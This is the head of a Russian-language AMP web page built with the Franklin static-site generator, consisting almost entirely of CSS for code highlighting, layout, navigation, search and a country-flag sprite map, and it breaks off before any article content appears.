<!doctypehtml><html amp lang=ru><script async src=https://cdn.ampproject.org/v0.js></script><meta charset=utf-8><meta content=width=device-width,minimum-scale=1,initial-scale=1 name=viewport><style amp-custom>.hljs{display:block;font-size:14px;line-height:1.45em;overflow-x:auto;padding:.5em;color:var(--text-color);background:var(--block-background)}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:var(--text-color);font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:var(--text-color);font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}:root{--block-background: var(--accent2);--small: 14px;--normal: 19px;--text-color: hsv(0, 0%, 20%)}.franklin-content .row{display:block}.franklin-content .left{float:left;margin-right:15px}.franklin-content .right{float:right}.franklin-content .container img{width:auto;padding-left:0;border-radius:10px}.franklin-content .footnote{position:relative;top:-.5em;font-size:70%}.franklin-toc li{margin:.6rem 0}.franklin-content{position:relative;padding-left:12.5%;padding-right:12.5%;line-height:1.35em}@media (min-width: 940px){.franklin-content{width:705px;margin-left:auto;margin-right:auto}}@media (max-width: 480px){.franklin-content{padding-left:6%;padding-right:6%}}.franklin-content h1{font-size:24px}.franklin-content h2{font-size:22px}.franklin-content h3{font-size:20px}.franklin-content h1,h2,h3,h4,h5,h6{text-align:left}.franklin-content h1{padding-bottom:.5em;border-bottom:3px double lightgrey;margin-top:1.5em;margin-bottom:1em}.franklin-content h2{padding-bottom:.3em;border-bottom:1px solid lightgrey;margin-top:2em;margin-bottom:1em}.franklin-content h1 a{color:inherit}.franklin-content h1 a:hover{text-decoration:none}.franklin-content h2 a{color:inherit}.franklin-content h2 a:hover{text-decoration:none}.franklin-content h3 a{color:inherit}.franklin-content h3 a:hover{text-decoration:none}.franklin-content h4 a{color:inherit}.franklin-content h4 a:hover{text-decoration:none}.franklin-content h5 a{color:inherit}.franklin-content h5 a:hover{text-decoration:none}.franklin-content h6 a{color:inherit}.franklin-content h6 a:hover{text-decoration:none}.franklin-content table{margin-left:auto;margin-right:auto;border-collapse:collapse;text-align:center}.franklin-content table *{line-height:.75rem}.franklin-toc ol ol{list-style-type:lower-alpha}.franklin-content th,td{font-size:var(--small);padding:10px;border:1px solid black}.franklin-content blockquote{background:var(--block-background);border-left:7px solid #a8a8a8;margin:1.5em 10px;padding:.5em 10px;font-style:italic}.franklin-content blockquote p{display:inline}.franklin-content li p{margin:10px 0}.franklin-content a{color:var(--alt2);text-decoration:none}.franklin-content a:hover{text-decoration:underline}.franklin-content .eqref a{color:green}.franklin-content .bibref a{color:green}.franklin-content sup{font-size:70%;vertical-align:super;line-height:0}.franklin-content sup a.fnref,.franklin-content td.fndef-backref a{overflow:visible;display:initial;padding-bottom:.3rem;padding-top:.2rem}.franklin-content table.fndef{margin:0 0 10px}.franklin-content .fndef tr,td{padding:0;border:0;text-align:left}.franklin-content .fndef tr{border-left:2px solid lightgray}.franklin-content .fndef td.fndef-backref{vertical-align:top;font-size:70%;padding-left:5px}.franklin-content .fndef td.fndef-content{font-size:80%;padding-left:10px;width:100%}.franklin-content img{width:70%;text-align:center;padding-left:10%}.franklin-content .img-small img{width:50%;text-align:center;padding-left:20%}body{counter-reset:eqnum}.katex{font-size:1em}.katex-display .katex{display:inline-block;white-space:normal}.katex-display:after{counter-increment:eqnum;content:"(" counter(eqnum) ")";position:relative;float:right;padding-right:5px}code{background-color:var(--block-background);padding:.1em .2em;border-radius:2px;font-size:var(--small);overflow:auto}code.plaintext{display:block}.scrollbox{width:10em;height:10em;overflow:auto;visibility:hidden}.scrollbox-content,.scrollbox:hover,.scrollbox:focus{visibility:visible}.scrollbox_delayed{transition:visibility .2s}.scrollbox_delayed:hover{transition:visibility 0s .2s}.hljs{font-size:var(--small);line-height:1.35em;border-radius:10px}.hljs-meta,.hljs-metas,.hljs-metap{font-weight:bold}.hljs-meta{color:#19b333}.hljs-metas{color:red}.hljs-metap{color:#3383e7}.franklin-content .colbox-blue{background-color:#eef3f5;padding:5px 10px;margin-left:5px;margin-top:5px;margin-bottom:5px;border-radius:0 10px 10px 0;border-left:5px solid #4c9cf1}body.light{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--alt4: #ffbebe;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: light){body{--accent: #3152ff;--accent2: #5a61ae;--accent3: #651b00;--alt: #ae6600;--alt2: #9e6c47;--alt3: #7f4200;--background-color: #ffebee;--foreground-color: #1c0005;--block-background: #423833;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body.dark{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}@media (prefers-color-scheme: dark){body{--accent: #72e200;--accent2: #add3a0;--accent3: #7a9eff;--alt: #8abeff;--alt2: #836bd1;--alt3: #a090de;--background-color: #001d49;--foreground-color: #dae2ff;--block-background: #011627;--red: #e42a2f;--yellow: #917329;--green: #29892d}}body{background:var(--background-color);font-style:var(--accent);font-family:Helvetica;padding:0 .5rem;line-height:2rem;color:var(--accent3);max-width:1280px;min-height:720px;margin:auto;min-width:320px}a{color:var(--accent)}a:visited{color:var(--accent2)}.author__place .author__bio{font-size:1rem}.franklin-content blockquote{border-left-color:var(--accent)}.franklin-content{color:var(--foreground-color)}.franklin-content #title a,.franklin-content .header-anchor{padding:.5rem;line-height:100%}.franklin-content a{outline-style:outset;outline-width:1px;padding:0 .1rem;margin:0 .1rem;outline-color:var(--alt2)}.franklin-content img{width:auto;text-align:center;padding:0}body>div>h1{text-align:center;color:var(--accent2)}body>div #title,body>div #page-description{text-align:center}.page__footer{margin-top:1rem;padding-top:1rem}.franklin-content .intro{font-size:1.2rem;text-align:left}.franklin-content .intro ul{list-style-type:none;font-size:1.1rem;font-style:italic}.franklin-content .intro a{font-variant:small-caps;padding-bottom:.2rem;font-size:1.4rem;font-style:normal}.franklin-content .intro .icon{padding:0 .2rem;font-size:1rem}.franklin-content .active-projects ul h4{font-size:1.5rem;font-variant:small-caps;font-style:normal;margin:.2rem}.franklin-content h3{font-size:.9rem}.posts_list h3{text-align:center}.svg-inline--fa.icon{width:1rem}.masthead__menu{height:4rem;line-height:4rem;padding:10px 0;position:relative}.site-title{float:left;font-weight:bold;width:15rem;font-size:1.5rem;text-decoration:none;color:var(--accent)}.site-title:visited{color:var(--accent)}#site-nav{float:right;font-size:1.5rem;font-family:Courier New;font-weight:bold;position:absolute;right:0}#site-nav .horiz ul{list-style-type:none;line-height:4rem;height:4rem;margin:0}#site-nav .horiz ul>li{padding:0 .5rem;box-shadow:.25rem -.025rem .05rem var(--alt)}#site-nav .horiz ul>li{float:left;border-top:0;border-bottom:0;border-left:0;border-radius:50% 25% 25% 50%}#site-nav ul>li>a,#site-nav ul>li>button{color:var(--alt);display:inline-block}#site-nav .menu-icons{position:relative;padding:0 .2rem}#site-nav{display:block;width:auto;height:auto}.masthead__inner-wrap{display:block;width:100%;padding:10px 0;height:inherit}.author__avatar>img{width:4em;height:4em;border-radius:50%;object-fit:cover;border-width:.1rem;border-color:var(--accent3);border-style:solid;box-shadow:.1rem .06rem var(--accent3),-.05rem -.025rem .2rem var(--accent3)}#site-nav a:link{text-decoration:none}#site-nav .vert,#site-nav .ham{display:none}.author__avatar{object-fit:contain;float:left}.author__name{display:none}.author__place{font-size:.65em}.author__wrap>ul{float:left;height:inherit;margin:0;padding:0 10px}.author__wrap>ul>li{position:relative;float:left;list-style-type:none;font-size:1rem;padding:0 .2rem;text-align:center}.page__footer ul>li{list-style-type:none}ul>li.author__urls{font-size:2rem}ul>li.author__urls a:visited{color:var(--accent)}ul>li.author__urls a:hover{filter:drop-shadow(.1rem .1rem 0 var(--accent2)) brightness(1.5);filter:brightness(1.5);transition-property:-moz-filter,-ms-filter,-o-filter,-webkit-filter,filter;transition-duration:.2s}ul>li.author__place a{color:var(--accent3);text-decoration:none;text-shadow:0 0 .01rem var(--alt2)}.author__wrap .author__avatar{float:left}.langs-dropdown-wrapper{cursor:pointer}.langs-dropdown-content{display:none;text-align:left}.langs-dropdown-content.show{display:block}.langs-dropdown-content a{display:block}.menu-lang-btn:before{border-radius:25% 25% 25% 50%}@media (max-width: 680px){.lang-link{height:3rem}}.lang-link .flag-icon,.lang-link .flag{position:absolute;left:1rem;margin-top:.65rem}#langs-dropdown-menu{left:1.5rem;position:relative;top:1rem}#langs-dropdown-menu #lang-list{font-size:1rem;line-height:2rem;overflow-x:hidden;height:20rem;position:absolute;overflow-y:scroll;right:1rem;scrollbar-width:thin;border:solid;border-radius:25%;border-width:0 0 0 .25rem;transition:height;padding-left:3rem}#langs-dropdown-menu .lang-link:hover{color:var(--foreground-color)}#lang-list{background-color:var(--background-color)}#site-nav ul>li>button{background:inherit;border:inherit;font-size:inherit;font-family:inherit;font-weight:inherit;padding:inherit;margin:inherit;list-style-type:inherit;line-height:inherit;height:inherit}.page-foot{font-size:.7em;line-height:1.25em;text-align:right;display:inline-block;width:100%}.franklin-content{padding:0 0 2rem;z-index:0}.franklin-content,.tag-content{padding-top:1rem}.author__bio li{list-style:none}.author__bio li p{margin:0;padding:0}#tag-name{font-size:1.5rem;padding:.5rem;font-weight:bold;font-variant:small-caps}#tag_title{font-variant:small-caps}#tag_title .wrap{text-align:left}#tag_title>.wrap>*{display:inline-block;text-align:left}#tag_cloud{font-weight:bold}.posts_list.franklin-content>ul{list-style-type:"> "}.posts_list.franklin-content>.title{font-variant:small-caps}.posts_list.franklin-content>.title>h2{font-size:1rem;font-style:italic}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title>a>h1{display:inline}.posts_list.franklin-content>ul>li{line-height:1.2rem;padding:.1rem}.posts_list.franklin-content>ul>li>p{padding:.1rem;margin:.1rem}.posts_list.franklin-content>.title>h2,.posts_list.franklin-content>.title{text-align:center;display:block;margin:1rem}.page__footer-links>ul>li>a{padding:.2rem;margin:.2rem}#tag_cloud>a{padding:.2rem;font-variant:small-caps;vertical-align:middle;margin:.3rem;display:inline-block;text-decoration:none;text-shadow:0 0 5rem white}#tag_cloud .icon{font-size:1rem;vertical-align:middle;margin-right:.2rem;margin-left:.2rem}#tag_cloud_wrapper{display:inline-block;width:100%;text-align:center}#post-tags-list{font-variant:small-caps;font-weight:bold}.media{font-size:1.5rem;line-height:2rem}#library .book-author{color:var(--accent2);font-size:.9rem;display:inline}#searchResults ul li{margin-bottom:1rem}#lunrSearchForm{margin-right:-.4rem;font-size:0;overflow:hidden}#lunrSearchForm .search-input{background:var(--background-color);color:var(--alt);border-width:.2rem;border:none;outline:none;border-radius:50% 25% 25% 50%;line-height:1.75rem;padding:.5rem 0 .5rem 2.25rem;width:7rem;position:relative;top:.5rem;font-family:"Courier New";font-weight:bold;font-size:1.5rem}#lunrSearchForm .search-input:focus{background:var(--block-background)}#lunrSearchForm .search-button{color:var(--alt);background:none;border:none;font-size:1.5rem;padding:.2rem .2rem .2rem 0;position:absolute;top:1rem;left:.75rem;z-index:1;cursor:pointer}#lunrSearchForm .search-button:focus{color:var(--accent)}@media (min-width: 680px) and (max-width: 1300px){#lunrSearchForm .search-input{font-size:1rem;padding-left:2.75rem;width:4.5rem;border-radius:50% 100% 100% 50%}}@media (max-width: 680px){#lunrSearchForm{display:block;width:28rem}#lunrSearch{position:absolute;top:-4rem;display:block;left:0;width:calc(2rem + 90%)}#lunrSearch .search-input{width:26rem}}@media (max-width: 480px){#lunrSearchForm .search-input{width:18rem;left:-4rem}}.result-title a{text-decoration:none}.result-title a:hover{text-decoration:underline}.result-preview{color:gray}.resultCount{color:gray}.result-query{font-weight:bold}#lunrSearchForm{margin-top:1em}footer>*{float:left}footer a{text-decoration:underline dotted}footer ul.author__wrap>li{float:left;padding:0 .2rem}footer ul.author__wrap>li a{line-height:2rem;height:inherit;display:block}footer ul.author__wrap{float:right;margin:0}footer .page__footer-copyright{margin:0}footer .page__footer-links{margin:0 .2rem 0 .4rem}footer .page__footer-links ul{display:inline;margin:0 .4rem 0 0;padding:0}footer .page__footer-links li{display:inline}@media (min-width: 680px){#tag-name,.tag-desc{text-align:left}}@media (min-width: 680px) and (max-width: 1300px){body{max-width:640px;min-height:320px}#site-nav{position:relative;z-index:1}#site-nav .ham:hover{cursor:pointer}#site-nav .ham{outline:none}#site-nav .ham,#site-nav .ham-icon{display:block;height:3rem;line-height:3rem;position:absolute;right:0;top:0;text-align:right;background:transparent;border:none;font-size:3rem;color:var(--accent)}#site-nav .horiz{display:none}#site-nav .vert{display:block;float:none;position:absolute;right:0;top:3rem;width:8rem;padding-left:1rem;max-height:0rem;overflow:hidden;filter:blur(1rem);transition:max-height .33s ease-in,filter .33s ease-in}#site-nav .vert ul{margin:0;padding:10px 0}#site-nav .vert ul>li{width:100%;text-align:center;border-radius:25% 50% 50% 25%;adding:.5rem 1rem;box-shadow:-.25rem 0 .05rem var(--alt)}}@media (max-width: 680px){.masthead,.masthead__inner-wrap,.masthead__menu{display:block}.site-title{float:none;width:100%;display:block;text-align:center}.author__wrap{float:none;display:block;width:100%;height:4.4rem;text-align:center}.author__wrap ul{width:auto;float:none;padding:0;display:inline-block}#tag-name,.tag-desc{text-align:center}#site-nav{float:none;padding:10px 0;position:relative;top:4rem}#site-nav ul li{float:none}.horiz{text-align:center}#site-nav ul{display:inline-block;padding:0}.masthead{height:14rem}.page__footer{width:100%;display:block}.page__footer{text-align:center}footer{display:inline-block;text-align:center}footer>*{display:inline-block;float:none}footer ul.author__wrap{float:none}footer .author__urls.social-icons{font-size:1rem}.page-foot .copyright{display:inline-block}}@media (max-width: 480px){#site-nav{top:5rem}}@media (max-width: 480px){.masthead{height:30rem}#site-nav ul li{width:calc(100% - 2rem)}}@media (max-width: 680px){.masthead{height:26rem}#site-nav{z-index:1}footer ul.author__wrap{margin-top:1rem;text-align:center;margin-left:0;padding-left:0}footer ul.author__wrap>li{float:none;display:inline-block}.page__footer{margin-top:3.5rem}}.site-title{-webkit-backface-visibility:hidden;backface-visibility:hidden;font-size:1.5rem;font-family:"VT323",monospace,sans-serif;color:var(--accent2);-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}.site-title:after{content:"​";position:relative;padding-right:.5em;border-right:.5em solid var(--accent);white-space:nowrap;-webkit-animation:chars 5.52s linear 1s forwards,cursor 1s 3;animation:chars 5.52s linear 1s forwards,cursor 1s 3}.hvr-buzz-out{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px #0000}.hvr-buzz-out:hover,.hvr-buzz-out:focus,.hvr-buzz-out:active{-webkit-animation-name:hvr-buzz-out;animation-name:hvr-buzz-out;-webkit-animation-duration:.75s;animation-duration:.75s;-webkit-animation-timing-function:linear;animation-timing-function:linear;-webkit-animation-iteration-count:1;animation-iteration-count:1}.franklin-content a{display:inline-block;vertical-align:middle;text-decoration:none;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative;overflow:hidden}.franklin-content a:before{content:"";position:absolute;z-index:-1;left:51%;right:51%;bottom:0;background:var(--accent);height:4px;-webkit-transition-property:left,right;transition-property:left,right;-webkit-transition-duration:.3s;transition-duration:.3s;-webkit-transition-timing-function:ease-out;transition-timing-function:ease-out}.franklin-content a:hover:before,.franklin-content a:focus:before,.franklin-content a:active:before{left:0;right:0}.hvr-outline-in{display:inline-block;vertical-align:middle;-webkit-transform:perspective(1px) translateZ(0);transform:perspective(1px) translateZ(0);box-shadow:0 0 1px var(--alt2);position:relative}.horiz .hvr-outline-in:before{border-radius:50% 25% 25% 50%;right:-.25rem}.vert .hvr-outline-in:before{border-radius:25% 50% 50% 25%;left:-.25rem}.hvr-outline-in:before{pointer-events:none;content:"";position:absolute;border:var(--alt) solid .25rem;top:0;bottom:0;left:0;opacity:0;-webkit-transition-duration:.2s;transition-duration:.2s;-webkit-transition-property:top,right,bottom,left;transition-property:top,right,bottom,left}.horiz .hvr-outline-in:hover:before,.horiz .hvr-outline-in:focus:before,.horiz .hvr-outline-in:active:before{top:-.5rem;right:-.5rem;bottom:-.5rem;left:0;opacity:1}.vert .hvr-outline-in:hover:before,.vert .hvr-outline-in:focus:before,.vert .hvr-outline-in:active:before{top:-.5rem;right:0;bottom:-.5rem;left:-.5rem;opacity:1}#site-nav .vert:before{background-color:var(--background-color);filter:blur(.25rem);content:"";height:100%;width:100%;position:absolute}.author__avatar{background-color:transparent;perspective:1000px}.masthead__menu ul li.author__avatar img{transition:transform .8s;transform-style:preserve-3d}.masthead__menu li.author__avatar:hover img{transform:rotateY(180deg);cursor:pointer}body.light .hljs{display:block;overflow-x:auto;padding:.5em;color:#000;background:#f8f8ff}body.light .hljs-comment,body.light .hljs-quote{color:#408080;font-style:italic}body.light .hljs-keyword,body.light .hljs-literal,body.light .hljs-selector-tag,body.light .hljs-subst{color:#954121}body.light .hljs-number{color:#40a070}body.light .hljs-doctag,body.light .hljs-string{color:#219161}body.light .hljs-section,body.light .hljs-selector-class,body.light .hljs-selector-id,body.light .hljs-type{color:#19469d}body.light .hljs-params{color:#00f}body.light .hljs-title{color:#458;font-weight:700}body.light .hljs-attribute,body.light .hljs-name,body.light .hljs-tag{color:navy;font-weight:400}body.light .hljs-template-variable,body.light .hljs-variable{color:teal}body.light .hljs-link,body.light .hljs-regexp{color:#b68}body.light .hljs-bullet,body.light .hljs-symbol{color:#990073}body.light .hljs-built_in,body.light .hljs-builtin-name{color:#0086b3}body.light .hljs-meta{color:#999;font-weight:700}body.light .hljs-deletion{background:#fdd}body.light .hljs-addition{background:#dfd}body.light .hljs-emphasis{font-style:italic}body.light .hljs-strong{font-weight:700}.flag{display:inline-block;position:relative;width:16px;height:11px;background:url(/assets/flags.png) no-repeat}.flag.flag-gu{background-position:-96px -55px}.flag.flag-mn{background-position:-208px -88px}.flag.flag-va{background-position:-48px -154px}.flag.flag-tibet{background-position:-32px -143px}.flag.flag-fo{background-position:-64px -44px}.flag.flag-th{background-position:-16px -143px}.flag.flag-tr{background-position:-144px -143px}.flag.flag-tl{background-position:-80px -143px}.flag.flag-kz{background-position:-144px -77px}.flag.flag-zm{background-position:-16px -165px}.flag.flag-uz{background-position:-32px -154px}.flag.flag-dk{background-position:-64px -33px}.flag.flag-scotland{background-position:-176px -121px}.flag.flag-gi{background-position:-224px -44px}.flag.flag-gy{background-position:-128px -55px}.flag.flag-bj{background-position:-112px -11px}.flag.flag-fr{background-position:-80px -44px}.flag.flag-mo{background-position:-224px -88px}.flag.flag-ir{background-position:-112px -66px}.flag.flag-io{background-position:-80px -66px}.flag.flag-tm{background-position:-96px -143px}.flag.flag-ch{background-position:-96px -22px}.flag.flag-mt{background-position:-32px -99px}.flag.flag-nl{background-position:-240px -99px}.flag.flag-gp{background-position:-16px -55px}.flag.flag-im{background-position:-48px -66px}.flag.flag-tv{background-position:-176px -143px}.flag.flag-mu{background-position:-48px -99px}.flag.flag-pe{background-position:-96px -110px}.flag.flag-vi{background-position:-112px -154px}.flag.flag-hn{background-position:-176px -55px}.flag.flag-ss{background-position:-128px -132px}.flag.flag-ae{background-position:-16px 0}.flag.flag-td{background-position:-240px -132px}.flag.flag-pw{background-position:0 -121px}.flag.flag-nu{background-position:-32px -110px}.flag.flag-bt{background-position:-208px -11px}.flag.flag-ms{background-position:-16px -99px}.flag.flag-cv{background-position:-240px -22px}.flag.flag-es{background-position:-224px -33px}.flag.flag-mh{background-position:-144px -88px}.flag.flag-la{background-position:-160px -77px}.flag.flag-vn{background-position:-128px -154px}.flag.flag-py{background-position:-16px -121px}.flag.flag-br{background-position:-176px -11px}.flag.flag-ye{background-position:-224px -154px}.flag.flag-ie{background-position:0 -66px}.flag.flag-gh{background-position:-208px -44px}.flag.flag-cg{background-position:-80px -22px}.flag.flag-cu{background-position:-224px -22px}.flag.flag-hu{background-position:-224px -55px}.flag.flag-sg{background-position:-224px -121px}.flag.flag-at{background-position:-176px 0}.flag.flag-lk{background-position:-224px -77px}.flag.flag-vu{background-position:-144px -154px}.flag.flag-bo{background-position:-160px -11px}.flag.flag-jo{background-position:-208px -66px}.flag.flag-er{background-position:-208px -33px}.flag.flag-za{background-position:-256px -154px}.flag.flag-rs{background-position:-80px -121px}.flag.flag-nr{background-position:-16px -110px}.flag.flag-ls{background-position:-256px -77px}.flag.flag-jm{background-position:-192px -66px}.flag.flag-tz{background-position:-208px -143px}.flag.flag-ki{background-position:-16px -77px}.flag.flag-sj{background-position:0 -132px}.flag.flag-cz{background-position:-16px -33px}.flag.flag-pg{background-position:-128px -110px}.flag.flag-lv{background-position:-32px -88px}.flag.flag-do{background-position:-96px -33px}.flag.flag-lu{background-position:-16px -88px}.flag.flag-no{background-position:-256px -99px}.flag.flag-kw{background-position:-112px -77px}.flag.flag-mx{background-position:-96px -99px}.flag.flag-yt{background-position:-240px -154px}.flag.flag-ly{background-position:-48px -88px}.flag.flag-cy{background-position:0 -33px}.flag.flag-ph{background-position:-144px -110px}.flag.flag-my{background-position:-112px -99px}.flag.flag-sm{background-position:-48px -132px}.flag.flag-et{background-position:-240px -33px}.flag.flag-ru{background-position:-96px -121px}.flag.flag-tj{background-position:-48px -143px}.flag.flag-ai{background-position:-64px 0}.flag.flag-pl{background-position:-176px -110px}.flag.flag-kp{background-position:-64px -77px}.flag.flag-uy{background-position:-16px -154px}.flag.flag-gb{background-position:-112px -44px}.flag.flag-gs{background-position:-64px -55px}.flag.flag-kurdistan{background-position:-96px -77px}.flag.flag-rw{background-position:-112px -121px}.flag.flag-ec{background-position:-128px -33px}.flag.flag-mm{background-position:-192px -88px}.flag.flag-pa{background-position:-80px -110px}.flag.flag-wales{background-position:-160px -154px}.flag.flag-kg{background-position:-256px -66px}.flag.flag-ve{background-position:-80px -154px}.flag.flag-tk{background-position:-64px -143px}.flag.flag-ca{background-position:-16px -22px}.flag.flag-is{background-position:-128px -66px}.flag.flag-ke{background-position:-240px -66px}.flag.flag-ro{background-position:-64px -121px}.flag.flag-gq{background-position:-32px -55px}.flag.flag-pt{background-position:-256px -110px}.flag.flag-tf{background-position:-256px -132px}.flag.flag-ad{background-position:0 0}.flag.flag-sk{background-position:-16px -132px}.flag.flag-pm{background-position:-192px -110px}.flag.flag-om{background-position:-64px -110px}.flag.flag-an{background-position:-112px 0}.flag.flag-ws{background-position:-192px -154px}.flag.flag-sh{background-position:-240px -121px}.flag.flag-mp{background-position:-240px -88px}.flag.flag-gt{background-position:-80px -55px}.flag.flag-cf{background-position:-64px -22px}.flag.flag-zanzibar{background-position:0 -165px}.flag.flag-mw{background-position:-80px -99px}.flag.flag-catalonia{background-position:-32px -22px}.flag.flag-ug{background-position:-240px -143px}.flag.flag-je{background-position:-176px -66px}.flag.flag-km{background-position:-32px -77px}.flag.flag-in{background-position:-64px -66px}.flag.flag-bf{background-position:-48px -11px}.flag.flag-mc{background-position:-80px -88px}.flag.flag-sy{background-position:-192px -132px}.flag.flag-sn{background-position:-64px -132px}.flag.flag-kr{background-position:-80px -77px}.flag.flag-eu{background-position:-256px -33px}.flag.flag-bn{background-position:-144px -11px}.flag.flag-st{background-position:-144px -132px}.flag.flag-england{background-position:-192px -33px}.flag.flag-lc{background-position:-192px -77px}.flag.flag-dm{background-position:-80px -33px}.flag.flag-be{background-position:-32px -11px}.flag.flag-ni{background-position:-224px -99px}.flag.flag-ua{background-position:-224px -143px}.flag.flag-mz{background-position:-128px -99px}.flag.flag-pf{background-position:-112px -110px}.flag.flag-tn{background-position:-112px -143px}.flag.flag-ee{background-position:-144px -33px}.flag.flag-xk{background-position:-208px -154px}.flag.flag-sx{background-position:-176px -132px}.flag.flag-sd{background-position:-192px -121px}.flag.flag-gd{background-position:-128px -44px}.flag.flag-ci{background-position:-112px -22px}.flag.flag-sz{background-position:-208px -132px}.flag.flag-cl{background-position:-144px -22px}.flag.flag-fi{background-position:0 -44px}.flag.flag-ga{background-position:-96px -44px}.flag.flag-jp{background-position:-224px -66px}.flag.flag-de{background-position:-32px -33px}.flag.flag-np{background-position:0 -110px}.flag.flag-re{background-position:-48px -121px}.flag.flag-bg{background-position:-64px -11px}.flag.flag-sc{background-position:-160px -121px}.flag.flag-ng{background-position:-208px -99px}.flag.flag-qa{background-position:-32px -121px}.flag.flag-mk{background-position:-160px -88px}.flag.flag-aw{background-position:-208px 0}.flag.flag-kn{background-position:-48px -77px}.flag.flag-al{background-position:-80px 0}.flag.flag-bw{background-position:-240px -11px}.flag.flag-um{background-position:-256px -143px}.flag.flag-ky{background-position:-128px -77px}.flag.flag-tt{background-position:-160px -143px}.flag.flag-so{background-position:-80px -132px}.flag.flag-lt{background-position:0 -88px}.flag.flag-by{background-position:-256px -11px}.flag.flag-bb{background-position:0 -11px}.flag.flag-us{background-position:0 -154px}.flag.flag-md{background-position:-96px -88px}.flag.flag-ag{background-position:-48px 0}.flag.flag-hm{background-position:-160px -55px}.flag.flag-as{background-position:-160px 0}.flag.flag-eg{background-position:-160px -33px}.flag.flag-sv{background-position:-160px -132px}.flag.flag-sl{background-position:-32px -132px}.flag.flag-fk{background-position:-32px -44px}.flag.flag-am{background-position:-96px 0}.flag.flag-ck{background-position:-128px -22px}.flag.flag-tw{background-position:-192px -143px}.flag.flag-kh{background-position:0 -77px}.flag.flag-to{background-position:-128px -143px}.flag.flag-se{background-position:-208px -121px}.flag.flag-cd{background-position:-48px -22px}.flag.flag-pn{background-position:-208px -110px}.flag.flag-gr{background-position:-48px -55px}.flag.flag-id{background-position:-256px -55px}.flag.flag-vc{background-position:-64px -154px}.flag.flag-somaliland{background-position:-96px -132px}.flag.flag-bi{background-position:-96px -11px}.flag.flag-pk{background-position:-160px -110px}.flag.flag-pr{background-position:-224px -110px}.flag.flag-bd{background-position:-16px -11px}.flag.flag-co{background-position:-192px -22px}.flag.flag-fm{background-position:-48px -44px}.flag.flag-bm{background-position:-128px -11px}.flag.flag-ar{background-position:-144px 0}.flag.flag-bv{background-position:-224px -11px}.flag.flag-sb{background-position:-144px -121px}.flag.flag-mq{background-position:-256px -88px}.flag.flag-eh{background-position:-176px -33px}.flag.flag-bh{background-position:-80px -11px}.flag.flag-it{background-position:-144px -66px}.flag.flag-hr{background-position:-192px -55px}.flag.flag-sa{background-position:-128px -121px}.flag.flag-mv{background-position:-64px -99px}.flag.flag-mg{background-position:-128px -88px}.flag.flag-dz{background-position:-112px -33px}.flag.flag-gg{background-position:-192px -44px}.flag.flag-gm{background-position:-256px -44px}.flag.flag-af{background-position:-32px 0}.flag.flag-li{background-position:-208px -77px}.flag.flag-sr{background-position:-112px -132px}.flag.flag-vg{background-position:-96px -154px}.flag.flag-cr{background-position:-208px -22px}.flag.flag-tc{background-position:-224px -132px}.flag.flag-ao{background-position:-128px 0}.flag.flag-ma{background-position:-64px -88px}.flag.flag-mr{background-position:0 -99px}.flag.flag-gn{background-position:0 -55px}.flag.flag-ne{background-position:-176px -99px}.flag.flag-nf{background-position:-192px -99px}.flag.flag-wf{background-position:-176px -154px}.flag.flag-hk{background-position:-144px -55px}.flag.flag-gf{background-position:-160px -44px}.flag.flag-ps{background-position:-240px -110px}.flag.flag-ic{background-position:-240px -55px}.flag.flag-cw{background-position:-256px -22px}.flag.flag-ml{background-position:-176px -88px}.flag.flag-ax{background-position:-224px 0}.flag.flag-gl{background-position:-240px -44px}.flag.flag-dj{background-position:-48px -33px}.flag.flag-cn{background-position:-176px -22px}.flag.flag-ht{background-position:-208px -55px}.flag.flag-lr{background-position:-240px -77px}.flag.flag-tg{background-position:0 -143px}.flag.flag-ba{background-position:-256px 0}.flag.flag-ge{background-position:-144px -44px}.flag.flag-bz{background-position:0 -22px}.flag.flag-au{background-position:-192px 0}.flag.flag-iq{background-position:-96px -66px}.flag.flag-cm{background-position:-160px -22px}.flag.flag-gw{background-position:-112px -55px}.flag.flag-az{background-position:-240px 0}.flag.flag-na{background-position:-144px -99px}.flag.flag-fj{background-position:-16px -44px}.flag.flag-zw{background-position:-32px -165px}.flag.flag-bs{background-position:-192px -11px}.flag.flag-il{background-position:-16px -66px}.flag.flag-nz{background-position:-48px -110px}.flag.flag-me{background-position:-112px -88px}.flag.flag-si{background-position:-256px -121px}.flag.flag-nc{background-position:-160px -99px}.flag.flag-lb{background-position:-176px -77px}</style><style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style 